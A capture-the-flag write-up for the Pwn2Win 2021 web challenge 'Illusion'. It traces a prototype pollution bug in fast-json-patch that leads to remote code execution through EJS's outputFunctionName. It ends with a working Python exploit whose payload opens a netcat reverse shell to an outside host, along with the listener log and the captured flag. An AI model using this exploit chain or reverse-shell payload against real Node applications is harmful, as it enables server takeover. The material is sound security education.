# Pwn2Win 2021 - Illusion

## Challenge Description

> #### **Illusion - web - 152 pts**
>
> Laura just found a website used for monitoring security mechanisms on Rhiza's state and is planning to hack into it to forge the status of these security services. After that she will desactivate these security resources without alerting government agents. Your goal is to get into the server to change the monitoring service behavior.
>
> **Server:** nc illusion.pwn2win.party 1337

{% file src="../../../.gitbook/assets/illusion.tar.gz" caption="Attachment" %}

## Writeup

### First look

The challenge's attachment contains a source code of a website written in NodeJS.

```javascript
❯ tree .
.
├── Dockerfile
├── entrypoint.sh
├── flag.txt
├── readflag
└── src
    ├── index.js
    ├── package-lock.json
    ├── package.json
    ├── static
    │   └── style.css
    └── templates
        └── index.ejs

3 directories, 9 files
```

### Finding the bug

There is only a single javascript code file, so knowing where to look for the bug located is quite straightforward. The other files – e.g. `Dockerfile`, `entrypoint.sh` – do not contain anything interesting.

{% code title="src/index.js \(partial\)" %}
```javascript
let services = {
    status: "online",
    cameras: "online",
    doors: "online",
    dome: "online",
    turrets: "online"
}

app.get("/", async (req, res) => {
    const html = await ejs.renderFile(__dirname + "/templates/index.ejs", {services})
    res.end(html)
})
```
{% endcode %}

The `index.js` contains a web service using `express` and `ejs` to basically shows display a formatted javascript object `service` into table format on frontend.

![The website](../../../.gitbook/assets/image%20%2825%29.png)

There is an interesting API function `/change_status` that allows us to replace the property in JS object `service` to our inputted value using a library `fast-json-patch`. Something noteworthy is: there is no validation at all on the inputted values. This allow us to provide object `{}` instead of string.

{% code title="src/index.js \(partial\)" %}
```javascript
const jsonpatch = require('fast-json-patch')

app.post("/change_status", (req, res) => {

    let patch = []

    Object.entries(req.body).forEach(([service, status]) => {

        if (service === "status"){
            res.status(400).end("Cannot change all services status")
            return
        }

        patch.push({
            "op": "replace",
            "path": "/" + service,
            "value": status
        })
    });

    jsonpatch.applyPatch(services, patch)

    if ("offline" in Object.values(services)){
        services.status = "offline"
    }

    res.json(services)
})
```
{% endcode %}

Looking at the `fast-json-patch` GitHub page, there is an open [pull request](https://github.com/Starcounter-Jack/JSON-Patch/pull/262) fixing a prototype pollution bug. At this point, we already knows the bug, the rest is just to craft the exploit for RCE.

### Exploit

> `outputFunctionName` Set to a string \(e.g., `'echo'` or `'print'`\) for a function to print output inside scriptlet tags. -- [https://ejs.co/](https://ejs.co/)

From quick googling with keywords _"prototype pollution ejs"_, we can know that we can pollute prototype property `outputFunctionName` in EJS to get RCE. So the idea is:

* Using API, set the `service.cameras` property into object `{}`.
* Using API, set the `service.cameras.constructor.prototype.outputFunctionName` to our RCE reverse shell payload.
* In our VPS, Setup listener using netcat for incoming reverse shell.
* GET the website to trigger EJS to execute our payload.
* Reverse shell obtained, then read flag.

```python
import requests

'''
# inside vps:

root@esper:~# nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 35.223.81.55 37939

whoami
guest

./readflag
CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
'''

url = 'http://illusion.pwn2win.party:14473'
password = 'jfuqpriqtshvbabn' # provided from the challenge 

payload = "x;global.process.mainModule.require('child_process').exec('sh -c \"nc 1.2.3.4 8888 -e /bin/sh\"');x"

session = requests.Session()
session.auth = ('admin', password)
session.post(f'{url}/change_status', json={'cameras': {}})
session.post(f'{url}/change_status', json={
    'cameras/constructor/prototype/outputFunctionName': payload
})
session.get(url)
```

## Flag

`CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}`

